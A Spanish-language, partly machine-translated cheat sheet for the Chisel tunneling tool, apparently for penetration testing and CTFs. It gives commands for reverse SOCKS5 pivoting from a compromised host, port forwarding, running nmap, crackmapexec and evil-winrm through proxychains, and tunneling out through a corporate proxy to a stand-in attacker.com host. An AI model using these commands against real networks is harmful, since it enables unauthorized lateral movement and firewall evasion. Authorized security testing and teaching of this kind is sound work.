<!-- language-home-navigation -->
[🏠 Página Principal Española](../../README.es.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇫🇷 Français](README.fr.md) • [🇮🇹 Italiano](README.it.md)

[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🚇 Cincel - Hoja de referencia completa

[🇹🇷 Türkçe Sürüm](traducciones/README.tr.md)
```
   ██████╗██╗  ██╗██╗███████╗███████╗██╗     
  ██╔════╝██║  ██║██║██╔════╝██╔════╝██║     
  ██║     ███████║██║███████╗█████╗  ██║     
  ██║     ██╔══██║██║╚════██║██╔══╝  ██║     
  ╚██████╗██║  ██║██║███████║███████╗███████╗
   ╚═════╝╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝
      Fast TCP/UDP Tunnel over HTTP via SSH
```
<p align="centro">
  <img src="https://img.shields.io/badge/Chisel-Tunneling-orange?style=for-the-badge" alt="Cincel">
  <img src="https://img.shields.io/badge/HTTP_WebSocket-Evasion-blue?style=for-the-badge" alt="WebSocket">
  <img src="https://img.shields.io/badge/SOCKS5-Proxy-green?style=for-the-badge" alt="SOCKS5">
  <img src="https://img.shields.io/badge/Go-Portable-red?style=for-the-badge" alt="Ir">
</p>

<p align="centro">
  <b>⚡ Túnel TCP/UDP rápido transportado a través de HTTP, protegido mediante SSH, empaquetado como un único binario portátil</b>
</p>

---

## 📋 Tabla de contenidos

- [Introducción](#-introducción)
- [Cómo funciona](#-cómo-funciona)
- [Instalación](#-instalación)
- [Modos de arquitectura y túnel] (#-arquitectura--modos-túnel)
- [Configuración de Pentest estándar: Proxy SOCKS5 inverso](#-standard-pentest-setup-reverse-socks5-proxy)
  - [Paso 1: Iniciar el servidor en el atacante](#paso-1-iniciar-el-servidor-en-el-atacante)
  - [Paso 2: Conectar el cliente desde el destino](#paso-2-conectar-el-cliente-desde-el-objetivo)
  - [Paso 3: Configurar Proxychains](#paso-3-configurar-proxychains)
  - [Paso 4: Ejecutar herramientas sobre el túnel](#paso-4-ejecutar-herramientas-sobre-el-túnel)
- [Reenvío de puerto local](#-reenvío-de-puerto-local)
- [Reenvío de puerto remoto (captura de tráfico entrante)](#-reenvío-de-puerto-remoto-captura-trafico-entrante)
- [Autenticación y fijación de huellas dactilares] (#-autenticación--fijación de huellas dactilares)
- [Evasión de salida y encadenamiento de proxy HTTP](#-egress-evasion--http-proxy-chaining)
- [Chisel vs Ligolo-ng vs SSH](#-chisel-vs-ligolo-ng-vs-ssh)
- [Tabla de referencia rápida](#-tabla-de-referencia-rápida)
- [Consejos y mejores prácticas](#-consejos--mejores-prácticas)
- [Aviso legal](#-aviso-legal)
- [Recursos](#-recursos)

---

## 🎯 Introducción

**Chisel** es una herramienta de tunelización multiplataforma de código abierto escrita en Go que encapsula sesiones SSH seguras dentro de conexiones HTTP/WebSocket estándar.

Debido a que el tráfico parece una comunicación HTTP/HTTPS o WebSocket estándar en el cable, Chisel navega fácilmente a través de firewalls restrictivos, sistemas de inspección profunda de paquetes (DPI) y servidores proxy web corporativos que normalmente bloquearían el tráfico SSH o VPN sin procesar.

### Fortalezas clave

- 🚀 **Binario único:** Contiene tanto el servidor como el cliente en un binario independiente compilado estáticamente.
- 🛡️ **Evasión de firewall:** Túneles a través del puerto estándar 80/443 o WebSockets para integrarse en el tráfico web normal.
- 🔒 **Cifrado de forma predeterminada:** Utiliza criptografía SSH interna (claves ECDSA y AES-GCM).
- 🔄 **SOCKS5 y reenvío de puertos:** Crea proxies SOCKS5 inversos o puertos reenviados locales/remotos específicos sin esfuerzo.

---

## 🏗️ Cómo funciona
```
+------------------------------------+                         +-----------------------------------+
|          Attacker Machine          |                         |       Compromised Target Host     |
|          (192.168.1.100)           |                         |            (Dual-homed)           |
|                                    |                         |                                   |
| [chisel server --reverse -p 8080]  | <==== HTTP/WebSocket == | [chisel client 192.168.1.100:8080 |
|               |                    |       (TCP Port 8080)   |                 R:1080:socks]     |
|               v                    |                         |                  |                |
|  Local Port 1080 (SOCKS5 Proxy)    |                         |                  v                |
|               |                    |                         |        Internal Network Interface |
|      [proxychains nmap]            |                         |            (172.16.1.0/24)        |
+------------------------------------+                         +-----------------------------------+
```
---

## 📥 Instalación

### Kali Linux
```bash
sudo apt update && sudo apt install -y chisel
```
### De la fuente (Ir)
```bash
go install github.com/jpillora/chisel@latest
```
### Descargar binarios precompilados

Descargue archivos binarios independientes para Linux, Windows y macOS desde las versiones oficiales:
```bash
# Attacker Linux 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
gzip -d chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel && chmod +x chisel

# Windows Target 64-bit
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
gzip -d chisel_1.9.1_windows_amd64.gz && mv chisel_1.9.1_windows_amd64 chisel.exe
```
---

## 🔄 Configuración estándar de Pentest: Proxy SOCKS5 inverso

En las pruebas de penetración estándar y CTF, la máquina de destino está detrás de NAT/firewalls y no puede aceptar conexiones entrantes directas de su parte. Debes crear un **proxy SOCKS5 inverso**.

### Paso 1: Iniciar el servidor en el atacante

Inicie el servidor Chisel escuchando en el puerto `8000` (o `443` para evasión) con el reenvío de puerto inverso permitido:
```bash
chisel server --reverse -p 8000 -v
```
### Paso 2: Conectar el cliente desde Target

Ejecute el cliente en la máquina comprometida, conectándose nuevamente a la IP de su atacante y abriendo un proxy SOCKS5 inverso:

#### Objetivo de Linux:
```bash
./chisel client 192.168.1.100:8000 R:1080:socks
```
#### Destino de Windows:
```powershell
.\chisel.exe client 192.168.1.100:8000 R:1080:socks
```
> **Resultado:** ¡El servidor Chisel en su máquina atacante abre el puerto `1080` localmente como un proxy SOCKS5 enrutado a través del objetivo!

### Paso 3: Configurar Proxychains

Edite `/etc/proxychains4.conf` (o `/etc/proxychains.conf`) en su máquina atacante:
```ini
[ProxyList]
# protocol  host        port
socks5      127.0.0.1   1080
```
### Paso 4: ejecutar herramientas sobre el túnel

Prefije cualquier herramienta con `proxychains` para enrutarla a través del host interno comprometido:
```bash
# Nmap TCP Connect scan
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.50

# SMB authentication
proxychains crackmapexec smb 172.16.1.0/24 -u Administrator -p 'Password123'

# Evil-WinRM shell to an internal domain controller
proxychains evil-winrm -i 172.16.1.5 -u Administrator -p 'Password123'
```
---

## 🔀 Reenvío de puerto local

Reenvía un puerto interno específico desde detrás del objetivo directamente a la máquina atacante local sin necesidad de un proxy SOCKS completo.

### Ejemplo: acceder al servicio web interno (puerto 80)

Servidor del atacante (`192.168.1.100:8000`):
```bash
chisel server --reverse -p 8000
```
Cliente en el objetivo:
```bash
# Forward target's internal localhost:80 to attacker's localhost:8080
./chisel client 192.168.1.100:8000 R:8080:127.0.0.1:80
```
¡Ahora busque `http://127.0.0.1:8080` en su máquina atacante para ver el servidor web interno!

### Ejemplo: exponer la base de datos interna (MySQL 3306)

Cliente en el objetivo:
```bash
./chisel client 192.168.1.100:8000 R:3306:172.16.1.200:3306
```
Conéctese directamente desde su terminal atacante:
```bash
mysql -h 127.0.0.1 -P 3306 -u root -p
```
---

## 🌐 Reenvío de puertos remoto (captura de tráfico entrante)

Exponga un puerto en la máquina de destino que se enruta de regreso a un servicio en su cuadro de atacante (útil para entregar cargas útiles o capturar devoluciones de llamadas).
```bash
# Target opens port 9000, sending incoming connections to attacker's 9000
./chisel client 192.168.1.100:8000 9000:127.0.0.1:9000
```
---

## 🔐 Autenticación y fijación de huellas dactilares

En entornos en vivo, los puertos Chisel abiertos pueden ser secuestrados por partes no autorizadas. Proteja su túnel con autenticación:

### Autenticación (`--auth`)
```bash
# Attacker server enforces credentials
chisel server --reverse -p 8443 --auth "pentestuser:ComplexPassw0rd!"

# Target client authenticates
./chisel client --auth "pentestuser:ComplexPassw0rd!" 192.168.1.100:8443 R:1080:socks
```
### Fijación de huellas dactilares (`--fingerprint`)

Cuando se inicia el servidor, imprime su huella digital de clave pública SSH:
```
2026/10/29 20:00:00 server: Fingerprint 8a:1f:9c:...
```
Verifíquelo en el cliente para evitar la interceptación de MITM:
```bash
./chisel client --fingerprint "8a:1f:9c:..." 192.168.1.100:8443 R:1080:socks
```
---

## 🛡️ Evasión de salida y encadenamiento de proxy HTTP

Si el objetivo interno solo puede acceder a Internet a través de un proxy corporativo de autenticación:
```bash
# Route Chisel traffic through an upstream corporate proxy
./chisel client --proxy http://proxy.corp.local:8080 \
  --header "Proxy-Authorization: Basic dXNlcjpwYXNz" \
  https://attacker.com:443 R:1080:socks
```
---

## ⚖️ Chisel vs Ligolo-ng vs SSH

| Característica | Cincel | Ligolo-ng | Túnel SSH |
|---------|--------|-----------|--------------|
| **Método primario** | SOCKS5 y reenvío de puertos | Interfaz TUN (VPN) | SOCKS5 y reenvío de puertos |
| **Protocolo de transporte** | HTTP/WebSocket | TLS sin procesar | SSH (Puerto 22) |
| **Evasión del cortafuegos** | ⭐⭐⭐⭐⭐ Excepcional | ⭐⭐⭐⭐ Muy Bueno | ⭐⭐ Pobre (el puerto 22 suele estar bloqueado) |
| **Requiere raíz/administrador**| ❌ No (solo usuario) | ✅ Sí (Para crear dispositivo TUN) | ❌ No |
| **Escaneo SYN de Nmap (`-sS`)**| ❌ No | ✅ Sí | ❌ No |
| **Soporte UDP** | Parcial (vía SOCKS5) | ✅ UDP nativo completo | ❌ Muy limitado |

---

## 📊 Tabla de referencia rápida

| Modo | Comando | Propósito |
|------|---------|---------|
| **Servidor (inverso)** | `chisel server --reverse -p 8000` | Inicie la escucha del servidor inverso en 8000 |
| **Cliente (SOCKS5 inverso)** | `chisel client <IP>:8000 R:1080:socks` | Cree SOCKS5 inverso en el puerto 1080 del atacante |
| **Cliente (puerto de reenvío)** | `chisel client <IP>:8000 R:8080:127.0.0.1:80` | Asigna el puerto 80 del objetivo al 8080 del atacante |
| **Cliente (Exponer el puerto del atacante)** | `chisel client <IP>:8000 4444:127.0.0.1:4444` | Abrir el puerto 4444 en el enrutamiento del objetivo al atacante |
| **Servidor de autenticación** | `chisel server --reverse --auth "u:p" -p 8000` | Requerir credenciales de los clientes conectados |
| **Cliente de autenticación** | `chisel client --auth "u:p" <IP>:8000 R:socks` | Conéctese con credenciales |
| **Ajuste Keep-Alive** | `chisel client --keepalive 10s <IP>:8000 R:socks`| Evitar interrupciones de sesiones inactivas del firewall |

---

## 💡 Consejos y mejores prácticas

1. **Utilice el puerto 443 para máxima evasión:**
   Los firewalls a menudo inspeccionan el tráfico en puertos arbitrarios como 8000 u 8080. La ejecución de su servidor Chisel en el puerto `443` garantiza que el tráfico se vea idéntico a los WebSockets HTTPS.
2. **Tiempo de espera de sintonización de Proxychains:**
   Si las conexiones de las cadenas proxy se sienten lentas, edite `/etc/proxychains4.conf` y configure:
   ```ini
   tcp_read_time_out 15000
   tcp_connect_time_out 8000
   ```
3. **No se requieren privilegios de root en el destino:**
   A diferencia de las soluciones VPN o TUN, Chisel se ejecuta exclusivamente en el espacio del usuario. Puede ejecutar `chisel.exe` o `chisel` como cuentas de servicio con pocos privilegios (`www-data`, `nobody`, usuario estándar de Windows).

---

## ⚠️ Aviso legal

> **IMPORTANTE:** Chisel está diseñado para pruebas de redes autorizadas, simulación de equipos rojos y administración de sistemas. La implementación de herramientas de túnel en redes no autorizadas viola las leyes de seguridad informática.

---

## 📚 Recursos

- [Repositorio Chisel GitHub](https://github.com/jpillora/chisel)
- [Proyecto Proxychains-NG](https://github.com/rofl0r/proxychains-ng)